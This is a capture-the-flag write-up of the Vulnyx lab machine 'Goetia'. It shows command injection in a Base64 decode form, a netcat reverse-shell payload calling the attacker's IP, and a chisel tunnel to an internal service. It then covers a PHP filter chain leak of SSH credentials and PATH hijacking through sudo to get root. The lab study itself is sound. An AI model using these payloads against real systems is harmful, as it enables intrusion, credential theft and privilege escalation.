# Vulnyx: Goetia

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `UnD3sc0n0c1d0` |
| **Tools used** | `nmap` · `curl` · `html2text` · `nc` · `chisel` · `wfuzz` · `unzip` · `hydra` |
| **Tags** | `#CommandInjection` `#RCE` `#Pivoting` `#PHPFilterChain` `#PATHHijacking` |
| **URL** | https://vulnyx.com/machines/  |

The main page passes user input straight into a shell command, giving remote code execution and a reverse shell. From there, a service listening only on localhost is reached by tunneling through the box with `chisel`, exposing an internal web app whose backup ZIP leaks its source code. That source is vulnerable to a PHP filter chain exploit, used to leak SSH credentials. A final sudo rule that runs a script without a fixed `PATH` is hijacked to gain a root shell.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn goetia.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:54:CF:0D (Oracle VirtualBox virtual NIC)
```

Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
sudo nmap -p 22,80 -sCV goetia.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:4b:59:a4:1c:b2:3a:f4:74:b5:7d:cf:49:a3:a9:47 (RSA)
|   256 e9:eb:b8:67:48:f6:30:ec:e1:9a:27:ae:b7:1a:f9:05 (ECDSA)
|_  256 0e:80:18:c9:37:1b:df:51:11:eb:49:86:a5:e7:1c:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Base64 Decode
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
MAC Address: 08:00:27:54:CF:0D (Oracle VirtualBox virtual NIC)
```

The page title — `Base64 Decode` — already tells us what to expect on port 80: a small utility page, not a full application.

### Web Enumeration

The main page:

```
http://goetia.nyx
```

<img src="../Images/goetia/Pasted image 20260714213906.png"/>

As the nmap title suggested, the page is a simple Base64 decoding tool: a text field takes a string and returns its decoded value. That input field is the only place the app accepts user data, which makes it the natural target for testing.

## Initial Access

### Command Injection → RCE

After intercepting the decode request and testing a few payloads against the `input` field, a semicolon-separated payload is enough to break out into arbitrary command execution:

```bash
curl -sX POST "http://goetia.nyx/index.php" -d "input=;id;a" | grep "textarea" | html2text
uid=48(apache) gid=48(apache) groups=48(apache)
```

The output of `id` comes back inside the page's response, confirming the injection works. The same syntax is reused to get a reverse shell instead of a one-off command:

> **Payload:** `; ;nc 10.0.2.15 9001 -e /bin/sh`

<img src="../Images/goetia/Pasted image 20260714213952.png"/>

A listener catches the callback:

```bash
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.39] 44792
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

The shell is upgraded to something usable:

```bash
python -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

## Lateral Movement

### Pivoting to an Internal Service

```bash
bash-4.2$ cat /etc/passwd | grep home
ebathory:x:1000:1000:Elizabeth Bathory:/home/ebathory:/bin/bash
bash-4.2$ ss -tulnp
Netid  State      Recv-Q Send-Q Local Address:Port          Peer Address:Port
udp    UNCONN     0      0            *:68                       *:*
udp    UNCONN     0      0      127.0.0.1:323                     *:*
udp    UNCONN     0      0         [::1]:323                    [::]:*
tcp    LISTEN     0      128    127.0.0.1:8000                    *:*
tcp    LISTEN     0      128            *:22                      *:*
tcp    LISTEN     0      100    127.0.0.1:25                       *:*
tcp    LISTEN     0      128         [::]:80                    [::]:*
tcp    LISTEN     0      128         [::]:22                    [::]:*
tcp    LISTEN     0      100        [::1]:25                    [::]:*
```

`ss` shows a service bound to `127.0.0.1:8000` — reachable from inside the box, but not from the outside. `chisel` is used to tunnel it out. The binary is served over a quick HTTP server on the attack machine and pulled down on the target:

```bash
# Attacker machine
python -m http.server

# Victim machine
curl http://10.0.2.15:8000/chisel --output chisel
```

A reverse tunnel is set up: the attack machine runs a chisel server waiting for a client to connect back, and the target's chisel client requests a remote forward — anything hitting port 8000 on the *attack* machine gets forwarded through the tunnel to `127.0.0.1:8000` on the *target*:

```bash
# Attack Machine
chisel server -p 9002 --reverse
2026/07/14 14:31:46 server: Reverse tunnelling enabled
2026/07/14 14:31:46 server: Fingerprint JO9yqhma7pKrOPLTBF96kju4zunidJ1ngcjIuKz7/Ro=
2026/07/14 14:31:46 server: Listening on http://0.0.0.0:9002
2026/07/14 14:34:26 server: session#1: Client version (1.11.5) differs from server version (1.11.7-0kali1)
2026/07/14 14:34:26 server: session#1: Listening on http://0.0.0.0:9002
2026/07/14 14:34:26 server: session#1: tun: proxy#R:8000⇒8000: Listening on 0.0.0.0:9002

# Victim Machine
./chisel client 10.0.2.15:9002 R:8000:127.0.0.1:8000
2026/07/14 14:34:27 client: Connecting to ws://10.0.2.15:9002
2026/07/14 14:34:27 client: Connected (Latency 2.742592ms)
```

The internal service is now reachable locally:

```
http://localhost:8000
```
<img src="../Images/goetia/Pasted image 20260714214403.png"/>

### Finding and Reading a Backup

A content discovery scan is run against the tunneled app, fuzzing both filenames and extensions at once:

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -z list,php-zip "http://localhost:8000/FUZZ.FUZ2Z"

ID           Response   Lines   Word   Chars   Payload
========================================================
000000049:   403        9 L     28 W   276 Ch  ".htaccess - php"
000000052:   403        9 L     28 W   276 Ch  ".htpasswd - zip"
000000047:   403        9 L     28 W   276 Ch  ".hta - php"
000000050:   403        9 L     28 W   276 Ch  ".htaccess - zip"
000000051:   403        9 L     28 W   276 Ch  ".htpasswd - php"
000000048:   403        9 L     28 W   276 Ch  ".hta - zip"
000001524:   200        1 L     16 W   331 Ch  "autobackup - zip"
000004173:   200        0 L     0 W    0 Ch    "hidden - php"
000004413:   500        0 L     16 W   103 Ch  "index - php"
```

`autobackup.zip` turns up among the results:

```
http://localhost:8000/autobackup.zip
```

The archive holds the app's source:

```bash
unzip autobackup.zip
Archive:  autobackup.zip
  inflating: index.php
```

```bash
cat index.php
<?php
echo "<h1>MD5 function!</h1>";
echo "Do you want to know the MD5 value of an internal server file? Go ahead ... <br><br>";
$result = md5_file($_POST['input']);
echo "<b>File:</b> " . $_POST['input'] . "<br>";
echo "<b>MD5:</b> " . $result . "<br>";
?>
```

The line that matters is `md5_file($_POST['input'])`: the POST body is passed directly as the filename argument, with no validation. `md5_file()`, like most PHP file functions, resolves that argument through PHP's stream wrapper system — meaning a value like `php://filter/...` is honored just as readily as a plain path. That's the primitive the next step builds on.

### PHP Filter Chain Exploit

PHP's `php://filter` chains can be stacked to progressively transform a file's contents — without ever writing to disk — until what gets included is valid, attacker-chosen PHP. That's what this class of exploit automates: it brute-forces a chain of filters that mutates an existing file into arbitrary PHP, byte by byte, then triggers it through the include:

```bash
python3 filters_chain_oracle_exploit.py --target http://127.0.0.1:8000 --file '/var/www/html/hidden.php' --parameter input

[+] File /var/www/html/hidden.php leak is finished!
PD9waHAKZGVmaW5lKCdEQl90QU1lJywgJ0FuRWxpemFiZXRoYW5EZXZpbFdvcnNoaXBwZXJzUHJheWVyQm9vayonKZ
WZpbmUoJ0RCX1VTRVInLCAnZWJhdGhvcnknKTsKZGVmaW5lKCdEQl9QQVNTV09SRCcsICdDNDNyMW0wbjE0UzRuZ3VpbD
NudHUnKTsKZGVmaW5lKCdEQl9IT1NUJywgJ2xvY2FsaG9zdCcpOwZpbmUoJ0RCX0NIQVJTRVQnLCAndXRmOCcpOwo
7"<?phpndefine('DB_NAME', 'AnElizabethanDevilWorshippersPrayerBook');ndefine('DB_USER', 'eb
athory');ndefine('DB_PASSWORD', 'C43r1m0n14S4nguil3ntu');\ndefine('DB_HOST', 'localhost');\n
define('DB_CHARSET', 'utf8');?>"
```

> **Credentials:** `ebathory:C43r1m0n14S4nguil3ntu`

### Shell as ebathory

The credentials are validated against SSH:

```bash
hydra -l 'ebathory' -p 'C43r1m0n14S4nguil3ntu' ssh://goetia.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to red
uce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://goetia.nyx:22
[22][ssh] host: goetia.nyx   login: ebathory   password: C43r1m0n14S4nguil3ntu
1 of 1 test successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-14 15:01:38
```

They check out, and a connection follows:

```bash
ssh ebathory@goetia.nyx
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
ebathory@goetia.nyx's password:
[ebathory@goetia ~]$ id
uid=1000(ebathory) gid=1000(ebathory) groups=1000(ebathory)
[ebathory@goetia ~]$ ls -l /home/ebathory/
total 4
-r-------- 1 ebathory ebathory 41 Aug 17  2023 user.txt
[ebathory@goetia ~]$ cat /home/ebathory/user.txt
VulNyx{afb7eb9025d15f4e9fc4b8246d8bd745}
```

> **User flag:** `VulNyx{afb7eb9025d15f4e9fc4b8246d8bd745}`

## Privilege Escalation

### PATH Hijacking via `sudo`

```bash
[ebathory@goetia ~]$ sudo -l
[sudo] password for ebathory:
Matching Defaults entries for ebathory on goetia:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDI
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User ebathory may run the following commands on goetia:
    (root) SETENV: /opt/services.sh
[ebathory@goetia ~]$ cat /opt/services.sh
#!/bin/bash

/usr/bin/systemctl --no-pager | wc -l
```

The sudo rule lets `ebathory` run `/opt/services.sh` as root while keeping control of the `PATH` environment variable. The script itself calls at least one command — named `wc`, going by the payload below — without a full path, which means whatever `PATH` says to use for resolving `wc` is trusted. A fake `wc` is placed somewhere writable and put first in `PATH`:

```bash
[ebathory@goetia ~]$ echo "chmod +s /bin/bash" > /tmp/wc
[ebathory@goetia ~]$ chmod +x /tmp/wc
[ebathory@goetia ~]$ sudo PATH=/tmp:$PATH /opt/services.sh
[ebathory@goetia ~]$ /bin/bash -p
```

When the script runs as root and resolves `wc` from `/tmp` instead of its usual location, the fake binary runs instead — setting the SUID bit on `/bin/bash`:

```bash
bash-4.2# id
uid=1000(ebathory) gid=1000(ebathory) euid=0(root) egid=0(root) groups=0(root),1000(ebathory)
bash-4.2# ls -l /root
total 4
dr-x------ 2 root root 81 Aug 17  2023 php-filter
-r-------- 1 root root 41 Aug 17  2023 root.txt
bash-4.2# cat /root/root.txt
VulNyx{ddfcc0fa96f3fef1e5162a9858ce4ea1}
```

> **Root flag:** `VulNyx{ddfcc0fa96f3fef1e5162a9858ce4ea1}`

## Takeaways

- Any input passed to a shell command, directly or indirectly, is a command injection risk — a form that visibly runs `id` or a similar command is often just the low-friction way of confirming what's already there.
- A service that only listens on `127.0.0.1` isn't inaccessible, just not *directly* reachable — from inside the box, a tool like `chisel` turns that same service into something the attacker's own machine can reach.
- `php://filter` chains can turn a read-only local file inclusion into full code execution without needing any file upload — the "vulnerability" isn't the include itself, it's trusting that included content can't be shaped by the attacker at all.
- A sudo rule that preserves `PATH` for the invoking user is only as safe as every command the target script calls by name instead of by absolute path.